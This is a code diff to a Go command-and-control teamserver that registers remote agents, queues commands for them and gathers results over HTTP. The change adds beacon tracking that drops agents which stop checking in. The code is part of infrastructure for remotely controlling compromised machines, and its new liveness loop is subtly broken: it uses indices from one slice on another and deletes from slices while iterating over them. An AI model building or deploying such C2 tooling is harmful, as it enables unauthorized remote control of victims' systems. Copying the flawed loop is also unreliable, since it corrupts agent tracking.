@@ -5,6 +5,8 @@ import (
 	"math/rand"
 	"net/http"
 	"os"
+	"strconv"
+	"time"
 
 	"github.com/gin-gonic/gin"
 )
@@ -32,13 +34,19 @@ type Result struct {
 	Result    string
 }
 
+type Callback struct {
+	AgentUID     string
+	LastCallback int
+}
+
 var (
-	IP           string
-	Port         string
-	Password     string
-	AgentList    []Agent
-	AgentTasks   []Task
-	AgentResults []Result
+	IP             string
+	Port           string
+	Password       string
+	AgentList      []Agent
+	AgentTasks     []Task
+	AgentResults   []Result
+	AgentCallbacks []Callback
 )
 
 func randomString(n int) string {
@@ -52,7 +60,28 @@ func randomString(n int) string {
 	return string(b)
 }
 
-func registerListeners(r *gin.Engine) {
+func checkBeacons() {
+	for {
+		time.Sleep(1 * time.Second)
+		for _, callback := range AgentCallbacks {
+			for i, agent := range AgentList {
+				if agent.UID == callback.AgentUID {
+					AgentCallbacks[i].LastCallback = AgentCallbacks[i].LastCallback + 1
+					agent_sleep, _ := strconv.Atoi(agent.Sleep)
+					agent_buffer := agent_sleep + 5
+					fmt.Println("[*] Agent [" + agent.UID + "] last callback: " + strconv.Itoa(callback.LastCallback))
+					if callback.LastCallback > agent_buffer {
+						fmt.Println("[!] Agent [" + agent.UID + "] has gone offline.")
+						AgentList = append(AgentList[:i], AgentList[i+1:]...)
+						AgentCallbacks = append(AgentCallbacks[:i], AgentCallbacks[i+1:]...)
+					}
+				}
+			}
+		}
+	}
+}
+
+func registerHTTPListeners(r *gin.Engine) {
 	r.GET("/agents", func(c *gin.Context) {
 		c.JSON(http.StatusOK, gin.H{
 			"agents": AgentList,
@@ -62,6 +91,15 @@ func registerListeners(r *gin.Engine) {
 	r.GET("/tasks/:uid", func(c *gin.Context) {
 		uid := c.Param("uid")
 		tasks := []Task{}
+
+		for i, callback := range AgentCallbacks {
+			if callback.AgentUID == uid {
+				AgentCallbacks = append(AgentCallbacks[:i], AgentCallbacks[i+1:]...)
+			}
+		}
+
+		AgentCallbacks = append(AgentCallbacks, Callback{AgentUID: uid, LastCallback: 0})
+
 		for _, task := range AgentTasks {
 			if task.UID == uid {
 				tasks = append(tasks, task)
@@ -97,7 +135,6 @@ func registerListeners(r *gin.Engine) {
 
 				command_id := randomString(10)
 				temp_task := Task{UID: uid, CommandID: command_id, Command: command.Command}
-				// I apologize to anyone who has to read & understand this code.
 
 				AgentTasks = append(AgentTasks, temp_task)
 
@@ -132,6 +169,7 @@ func registerListeners(r *gin.Engine) {
 		c.JSON(http.StatusOK, gin.H{
 			"message": "Agent registered successfully",
 			"uid":     agent.UID,
+			"sleep":   agent.Sleep,
 		})
 	})
 
@@ -199,10 +237,15 @@ func main() {
 	}
 	gin.SetMode(gin.ReleaseMode)
 	r := gin.Default()
-	
 
-	registerListeners(r)
+	registerHTTPListeners(r)
 
-	fmt.Println("[*] Teamserver started on [" + IP + ":" + Port + "]")
-	r.Run(IP + ":" + Port)
+	go func() {
+		fmt.Println("[*] Teamserver started on [" + IP + ":" + Port + "]")
+		r.Run(IP + ":" + Port)
+	}()
+
+	go checkBeacons()
+
+	select {}
 }
